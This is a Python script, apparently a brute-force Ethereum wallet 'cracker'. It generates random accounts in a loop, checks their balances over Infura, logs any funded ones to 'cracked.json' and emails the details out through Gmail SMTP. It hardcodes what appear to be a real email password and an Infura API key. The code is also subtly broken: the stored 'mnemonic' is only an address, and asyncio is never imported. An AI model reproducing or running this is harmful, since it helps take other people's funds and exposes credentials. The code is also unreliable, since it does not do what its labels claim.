#!/usr/bin/env python3

import os
import json
import smtplib
from email.mime.text import MIMEText
from web3 import Web3

SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587
EMAIL_ADDRESS = 'nygagiga666@gmail.com'
EMAIL_PASSWORD = 'i82DXi6QSGdTWF8'

API_KEY = 'https://mainnet.infura.io/v3/74bfb53e63c24453aa7e4fa599ecc3f6'
provider = Web3(Web3.HTTPProvider(API_KEY))

def send_email(content):
    msg = MIMEText(content)
    msg['Subject'] = 'Dane portfeli'
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = EMAIL_ADDRESS

    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as smtp:
        smtp.starttls()
        smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        smtp.send_message(msg)

async def main():
    while True:
        wallet = provider.eth.account.create()
        mnemonic = wallet._address
        address = wallet.address
        balance = provider.fromWei(provider.eth.getBalance(address), 'ether')

        print(balance)

        if balance > 0:
            cracked_data = {}
            if os.path.isfile('./cracked.json'):
                with open('./cracked.json', 'r') as f:
                    cracked_data = json.load(f)

            cracked_data[address] = {"mnemonic": mnemonic, "balance": str(balance)}
            with open('./cracked.json', 'w') as f:
                json.dump(cracked_data, f, indent=4)

            content = f"{address}: {mnemonic}, {balance} ETH"
            send_email(content)

if __name__ == "__main__":
    asyncio.run(main())
